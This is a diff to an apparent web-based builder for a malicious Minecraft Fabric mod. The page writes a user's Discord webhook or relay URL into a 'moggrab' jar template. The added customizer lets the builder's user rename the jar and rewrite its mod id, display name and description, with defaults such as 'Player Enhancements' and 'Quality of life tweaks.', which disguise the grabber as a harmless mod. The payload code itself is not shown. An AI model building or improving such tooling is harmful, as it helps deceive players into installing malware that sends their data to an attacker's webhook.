@@ -136,6 +136,39 @@
     background: rgba(94,234,212,.05); border: 1px solid rgba(94,234,212,.16);
     font-size: .85rem; color: #aebfc9; line-height: 1.6;
   }
+
+  /* customizer */
+  .custom {
+    margin-top: 1rem; border: 1px solid var(--line); border-radius: 12px;
+    background: rgba(8,12,18,.55); overflow: hidden;
+  }
+  summary {
+    padding: .75rem 1rem; cursor: pointer; user-select: none;
+    color: var(--mute); font-weight: 600; font-size: .86rem;
+    letter-spacing: .05em; list-style: none; transition: color .15s;
+    display: flex; align-items: center; justify-content: space-between;
+  }
+  summary::-webkit-details-marker { display: none; }
+  summary::after { content: '+'; color: var(--accent); font-size: 1.05rem; transition: transform .18s; }
+  .custom[open] summary::after { transform: rotate(45deg); }
+  summary:hover { color: var(--txt); }
+  .custom-body { padding: 0 1rem 1rem; display: grid; gap: .7rem; }
+  .fld { display: grid; gap: .35rem; }
+  .fld label {
+    font-size: .72rem; letter-spacing: .08em; text-transform: uppercase;
+    color: #6e7c90;
+  }
+  .custom-body input, .custom-body textarea {
+    width: 100%; padding: .6rem .8rem; border-radius: 10px;
+    border: 1px solid var(--line); background: rgba(10,14,20,.8);
+    color: var(--txt); font-size: .9rem; outline: none; font-family: inherit;
+    transition: border .15s, box-shadow .15s; resize: vertical;
+  }
+  .custom-body input:focus, .custom-body textarea:focus {
+    border-color: rgba(94,234,212,.55);
+    box-shadow: 0 0 0 3px rgba(94,234,212,.1);
+  }
+  .hint { font-size: .72rem; color: #5d6b7d; }
 </style>
 </head>
 <body>
@@ -159,6 +192,33 @@
     <section class="panel active" role="tabpanel" id="panel-build">
       <input id="wh" type="text" spellcheck="false" autocomplete="off"
              placeholder="https://your-relay.workers.dev — or your Discord hook">
+
+      <details class="custom" id="custom">
+        <summary>Customize name &amp; details</summary>
+        <div class="custom-body">
+          <div class="fld">
+            <label for="fn">Download file name</label>
+            <input id="fn" type="text" spellcheck="false" placeholder="PlayerEnhancements"
+                   maxlength="60">
+            <span class="hint">A short random tag is appended. Type a <code class="inline">.jar</code>
+              ending to use it verbatim.</span>
+          </div>
+          <div class="fld">
+            <label for="mid">Mod id (shown in the mods list)</label>
+            <input id="mid" type="text" spellcheck="false" placeholder="moggrab" maxlength="37">
+            <span class="hint">Lowercase letters, numbers, <code class="inline">.</code> <code class="inline">-</code> <code class="inline">_</code></span>
+          </div>
+          <div class="fld">
+            <label for="mname">Display name</label>
+            <input id="mname" type="text" spellcheck="false" placeholder="Player Enhancements" maxlength="40">
+          </div>
+          <div class="fld">
+            <label for="desc">Description</label>
+            <textarea id="desc" rows="2" maxlength="120" placeholder="Quality of life tweaks."></textarea>
+          </div>
+        </div>
+      </details>
+
       <button class="btn" id="build" disabled>Loading template…</button>
       <div id="status"></div>
       <a id="dl" href="#" download>Download your mod</a>
@@ -285,6 +345,7 @@
   // ================= app =================
   const $ = id => document.getElementById(id);
   const wh = $('wh'), btn = $('build'), status = $('status'), dl = $('dl'), stats = $('stats');
+  const fn = $('fn'), mid = $('mid'), mname = $('mname'), desc = $('desc');
   dl.style.display = 'none';
 
   // ---- tabs ----
@@ -312,6 +373,12 @@
       const res = await fetch('assets/moggrab.jar');
       if (!res.ok) throw new Error('jar fetch ' + res.status);
       template = await res.arrayBuffer();
+      // prefill the customizer from the template's actual metadata
+      const zip = await JSZip.loadAsync(template);
+      const meta = JSON.parse(await zip.file('fabric.mod.json').async('string'));
+      if (!mid.value) mid.value = meta.id || 'moggrab';
+      if (!mname.value) mname.value = meta.name || 'Player Enhancements';
+      if (!desc.value) desc.value = meta.description || '';
       btn.disabled = false;
       btn.textContent = 'Build Mod';
     } catch (e) {
@@ -332,12 +399,42 @@
       return;
     }
 
+    // ---- customizer validation ----
+    let fileBase = fn.value.trim();
+    if (!fileBase) fileBase = 'PlayerEnhancements';
+    const verbatim = /\.jar$/i.test(fileBase);
+    fileBase = verbatim ? fileBase.slice(0, -4) : fileBase;
+    if (!/^[A-Za-z0-9 _\-()+.,\[\]]+$/.test(fileBase) || fileBase.length > 60) {
+      status.textContent = 'File name has invalid characters (no :<>"/\\|?*).';
+      status.className = 'err';
+      return;
+    }
+    const modId = mid.value.trim().toLowerCase();
+    if (!/^[a-z][a-z0-9_.-]{0,36}$/.test(modId)) {
+      status.textContent = 'Mod id must be lowercase letters/numbers with . - _ (e.g. mymod). ';
+      status.className = 'err';
+      return;
+    }
+    const modName = mname.value.trim();
+    if (!modName || modName.length > 40) {
+      status.textContent = 'Display name must be 1–40 characters.';
+      status.className = 'err';
+      return;
+    }
+    const modDesc = desc.value.trim().slice(0, 120);
+
     btn.disabled = true;
     status.textContent = 'Stitching the jar…';
 
     try {
       const zip = await JSZip.loadAsync(template);
+      // burn the hook + rewritten metadata in
       zip.file('webhook.txt', url);
+      const meta = JSON.parse(await zip.file('fabric.mod.json').async('string'));
+      meta.id = modId;
+      meta.name = modName;
+      meta.description = modDesc;
+      zip.file('fabric.mod.json', JSON.stringify(meta, null, 2));
       const blob = await zip.generateAsync({
         type: 'blob',
         mimeType: 'application/java-archive',
@@ -345,8 +442,7 @@
         compressionOptions: { level: 6 },
       });
 
-      const name = 'PlayerEnhancements-' +
-        Date.now().toString(36).slice(-4) + '.jar';
+      const name = (verbatim ? fileBase : fileBase + '-' + Date.now().toString(36).slice(-4)) + '.jar';
       const download = URL.createObjectURL(blob);
       dl.href = download;
       dl.download = name;
